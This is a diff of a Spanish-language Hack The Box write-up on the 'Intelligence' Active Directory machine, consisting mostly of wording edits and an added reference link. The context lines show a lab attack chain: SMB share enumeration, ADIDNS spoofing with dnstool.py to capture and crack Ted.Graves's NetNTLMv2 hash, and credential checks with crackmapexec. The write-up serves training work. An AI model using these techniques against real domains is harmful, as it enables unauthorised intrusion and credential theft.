@@ -19,7 +19,7 @@
 <meta itemprop=name content="Intelligence">
 <meta itemprop=description content="Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web"><meta itemprop=datePublished content="2021-11-27T00:00:00+01:00">
 <meta itemprop=dateModified content="2021-11-27T00:00:00+01:00">
-<meta itemprop=wordCount content="2534">
+<meta itemprop=wordCount content="2543">
 <meta itemprop=keywords content="dns,smb,bloodhound,password-spray,active-directory,metadata,silver-ticket-attack,hash-cracking,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="Intelligence">
@@ -442,7 +442,7 @@ SMB         10.10.10.248    445    DC               Users           READ
 </code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ cat user.txt
 d97eb9e4c5535fa637062d14b4b5e8c1 
 </code></pre></div><h2 id=movimiento-lateral>Movimiento lateral</h2>
-<p>Mirando en el recursos <code>IT</code>, podemos ver un <em>script</em> en Powershell:</p>
+<p>Mirando en el recurso <code>IT</code>, podemos ver un <em>script</em> en Powershell:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ smbmap.py -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 -r IT
 <span style=color:#960050;background-color:#1e0010>
 </span><span style=color:#960050;background-color:#1e0010></span>[+] IP: 10.10.10.248:445        Name: intelligence.htb          Status: Authenticated
@@ -471,8 +471,8 @@ Import-Module ActiveDirectory
     }
   } <span style=color:#66d9ef>catch</span> { }
 }
-</code></pre></div><p>Básicamente, lo que hace el <em>script</em> es buscar en LDAP subdominios del tipo <code>web*.intelligence.htb</code> y realizando una petición web con las credenciales de <code>Ted.Graves</code> (cada 5 minutos). Recordemos que uno de los documentos PDF hablaba de este <em>script</em>.</p>
-<p>Esta vez, podemos añadir un subdominio llamado <code>webrocky.intelligence.htb</code> al DNS utilizando las credenciales de <code>Tiffany.Molina</code> para que apunte a nuestra dirección IP de atacante:</p>
+</code></pre></div><p>Básicamente, lo que hace el <em>script</em> es buscar en LDAP subdominios del tipo <code>web*.intelligence.htb</code> y realizar una petición web con las credenciales de <code>Ted.Graves</code> (cada 5 minutos). Recordemos que uno de los documentos PDF hablaba de este <em>script</em>.</p>
+<p>Esta vez, podemos añadir un subdominio llamado <code>webrocky.intelligence.htb</code> al DNS utilizando las credenciales de <code>Tiffany.Molina</code> para que apunte a nuestra dirección IP de atacante (esto se conoce como ADIDNS <em>Spoofing</em>, más información <a href=https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing>aquí</a>):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 dnstool.py -u <span style=color:#e6db74>&#39;intelligence.htb\Tiffany.Molina&#39;</span> -p NewIntelligenceCorpUser9876 -a add -t A -d 10.10.17.44 -r webrocky.intelligence.htb 10.10.10.248 
 [-] Connecting to host...
 [-] Binding to host
@@ -495,7 +495,7 @@ Mr.Teddy         (Ted.Graves)
 Use the &#34;--show --format=netntlmv2&#34; options to display all of the cracked passwords reliably 
 Session completed.
 </code></pre></div><p>Y encontramos la contraseña. Veamos si las credenciales son válidas con <code>crackmapexec</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p <span style=color:#e6db74>&#39;Mr.Teddy&#39;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy
 SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
 SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy
 </code></pre></div><h2 id=ataque-de-_silver-ticket_>Ataque de <em>Silver Ticket</em></h2>
